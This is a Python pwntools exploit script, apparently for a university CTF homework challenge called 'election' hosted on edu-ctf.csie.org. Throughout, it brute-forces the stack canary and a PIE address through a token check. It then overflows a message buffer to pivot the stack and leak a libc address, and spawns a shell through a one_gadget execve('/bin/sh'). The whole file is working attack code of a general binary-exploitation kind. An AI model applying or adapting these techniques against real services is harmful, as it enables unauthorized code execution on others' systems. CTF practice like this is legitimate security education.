import binascii
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('../../hw7/libc.so')

p = remote('edu-ctf.csie.org', 10180)
# , env={"LD_PRELOAD": os.path.join(os.getcwd(), '../../hw7/libc.so')}
# p = process('./election')
# p = gdb.debug('./election', 'b main\n')
# gdb.attach(p, 'b main\n')

def login(token):
    p.sendlineafter('>', '2')
    p.sendafter('token:', token)
    p.sendlineafter('>', '1')
    p.sendafter('Token:', token)

prefix = b'A' * 0xb8

p.sendlineafter('>', '2')
p.sendafter('token:', prefix)

leaks = b''
for N in range(16):
    print('Brute-forcing: %d' % N, end='')
    for i in range(256):
        print('.', end='')
        p.sendlineafter('>', '1')
        p.sendafter('Token:', prefix + leaks + bytes((i,)))
        resp = p.recvline()
        if b'Invalid token' not in resp:
            # log.success('!!! found byte: %d', i)
            leaks += bytes((i,))
            p.sendlineafter('>', '3')
            print('OK')
            break
    else:
        log.failure('Fail to guess QQ')
        break

canary = leaks[:8]

log.success('Canary: %s', canary)

# __libc_csu_init == 0x1140
pie_base = u64(leaks[8:]) - 0x1140

log.success('PIE base: %s', hex(pie_base))

print('Voting')
votes = 0xff
rounds = (votes + 9) // 10
for i in range(rounds):
    login('dummy')

    for _ in range(10 if i != votes // 10 else (votes % 10)):
        print(i, end=' ')
        p.sendlineafter('>', '1')
        p.sendlineafter('[0~9]: ', '0')
    p.sendlineafter('>', '3')

print('OK')

login('AAA')
p.sendlineafter('>', '2')
p.sendlineafter('To [0~9]:', '0')
p.sendafter('Message:', b'A' * 0xe8 + canary + p64(pie_base + 0x2020b8 + 0xc8) + p64(pie_base + 0x1045)[:7])
p.sendlineafter('>', '3')

login(p64(pie_base + 0x201f90))
p.sendlineafter('>', '2')
p.sendlineafter('To [0~9]:', '0')
# ' To xxxxxx:'
puts_libc = u64(p.recvline()[4:10] + b'\0\0')
# libc_base = puts_libc - libc.symbols[b'puts']
libc_base = puts_libc - libc.symbols[b'puts']
log.success('libc base: %s', hex(libc_base))

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL
0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
one_gadget = libc_base + 0x4f322
p.sendafter('Message:', b'A' * 0xe8 + canary + p64(pie_base + 0x2020b8 + 0xc8 + 0x20) + p64(pie_base + 0x1045)[:7])
p.sendlineafter('>', '3')

token = (b'\0' * 0x20 +
        p64(pie_base + 0x2020b8 + 0xc8) +
        p64(one_gadget) +
        b'\0' * 0x50)

login(token)
p.sendlineafter('>', '2')
p.sendlineafter('To [0~9]:', '0')
p.sendafter('Message:', b'A' * 0xe8 + canary + p64(pie_base + 0x202160 + 0x20) + p64(pie_base + 0xbe9)[:7])
p.sendlineafter('>', '3')

p.interactive()
